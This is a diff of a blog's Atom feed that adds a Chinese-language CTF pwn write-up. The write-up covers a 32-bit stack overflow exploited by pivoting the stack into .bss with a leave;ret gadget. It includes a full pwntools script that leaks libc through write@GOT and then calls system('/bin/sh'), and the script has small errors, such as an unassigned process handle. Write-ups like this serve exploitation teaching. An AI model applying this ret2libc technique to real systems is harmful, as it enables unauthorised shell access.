@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://bobpanda.github.io/"/>
-  <updated>2020-08-05T11:35:43.173Z</updated>
+  <updated>2020-08-07T03:58:32.283Z</updated>
   <id>https://bobpanda.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>stack overflow review</title>
+    <link href="https://bobpanda.github.io/2020/08/07/stack-overflow-review/"/>
+    <id>https://bobpanda.github.io/2020/08/07/stack-overflow-review/</id>
+    <published>2020-08-07T03:01:11.000Z</published>
+    <updated>2020-08-07T03:58:32.283Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于某些众所周知的原因，最近得要把早已丢弃的pwn捡起来了，某些坑爹比赛密码手没人权（滑稽）。这次，先分析一个简单的栈指针劫持的栈溢出题。</p><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>32位程序，首先checksec检查下保护，发现pie和canary都没有开启。<br>打开题目，发现漏洞函数vul_function()</p><p><img src= "/img/loading.gif" data-lazy-src="/img/1.png" width="50%" height="50%"></p><p>漏洞点也很明显，最后buf多读了一些，导致在栈上多溢出了0x20-0x18=8位，仅仅刚能够覆盖ebp指针和返回地址，因此不能直接在这里构造ROP链。但是，ELF在bss段初始化生成了一个全局的s，读s的时候可以读入较长的数据。因此利用方法就呼之欲出了，就是在s中先写入构造好的ROP链，然后劫持栈指针指向s的地址执行这些gadgets。</p><p>那么怎么劫持栈指针呢？在intel汇编中有一条指令：<strong>leave</strong>。这条语句约等价于<code>mov esp ebp; pop ebp;</code>。所以我们覆盖的ebp就选择bss段的某个地址，然后找到leave ret的gadget，返回地址覆盖为leave_ret，这样esp就被劫持到bss段了。注意leave指令最后会pop，使栈顶指针增加，因此覆盖的ebp应当是s的实际地址-4。</p><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><ol><li>第一轮ROP先泄露libc的基地址，计算出system地址等。</li><li>第二轮ROP直接调用system函数getshell。</li></ol><h3 id="Exploit："><a href="#Exploit：" class="headerlink" title="Exploit："></a>Exploit：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x08048513</span></span><br><span class="line">bss_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048511</span></span><br><span class="line"></span><br><span class="line">rs.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>) <span class="comment">#第一轮泄露write地址</span></span><br><span class="line">rs.send(payload)</span><br><span class="line"></span><br><span class="line">rs.recvuntil(<span class="string">&quot;to say?&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr<span class="number">-4</span>)+p32(leave_ret) <span class="comment">#劫持栈指针</span></span><br><span class="line">rs.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr = u32(rs.recv(<span class="number">4</span>))</span><br><span class="line">log.success(write_addr)</span><br><span class="line"></span><br><span class="line">libc_write = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base = write_addr - libc_write</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_sh=libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line">sh_addr = libc_base+libc_sh</span><br><span class="line">rs.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">payload = p32(system_addr)+p32(main_addr) + p32(sh_addr) <span class="comment">#第二轮getshell</span></span><br><span class="line">rs.send(payload)</span><br><span class="line">rs.recvuntil(<span class="string">&quot;to say?&quot;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(bss_addr<span class="number">-4</span>)+p32(leave_ret)</span><br><span class="line">rs.send(payload2)</span><br><span class="line">rs.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;由于某些众所周知的原因，最近得要把早已丢弃的pwn捡起来了，某些坑爹比赛密码手没人权（滑稽）。这次，先分析一个简单的栈指针劫持的栈溢出题。&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="pwn" scheme="https://bobpanda.github.io/categories/pwn/"/>
+    
+    
+      <category term="stack overflow" scheme="https://bobpanda.github.io/tags/stack-overflow/"/>
+    
+  </entry>
   
   <entry>
     <title>年中随笔</title>
